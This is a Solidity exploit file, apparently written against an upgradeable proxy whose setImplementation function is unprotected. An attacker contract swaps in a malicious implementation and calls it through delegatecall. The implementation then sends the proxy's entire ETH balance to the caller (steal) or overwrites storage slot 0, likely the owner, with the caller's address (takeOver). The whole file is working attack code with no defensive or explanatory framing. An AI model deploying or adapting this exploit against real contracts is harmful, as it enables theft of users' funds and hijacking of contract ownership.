
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IProxy {
    function setImplementation(address impl) external;
    function implementation() external view returns (address);
}

contract HackImpl {
    // Runs in the PROXY's context via delegatecall: address(this) is the proxy
    function steal() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "steal failed");
    }

    function takeOver() external {
        assembly {
            sstore(0, caller()) // overwrite proxy slot 0 (e.g. owner)
        }
    }
}

contract DelegatecallAttack {
    function attack(address proxy, address hackImpl) external {
        IProxy(proxy).setImplementation(hackImpl);
        (bool ok, ) = proxy.call(abi.encodeWithSignature("steal()"));
        require(ok, "delegatecall failed");
    }

    receive() external payable {} // receives the swept proxy ETH
}
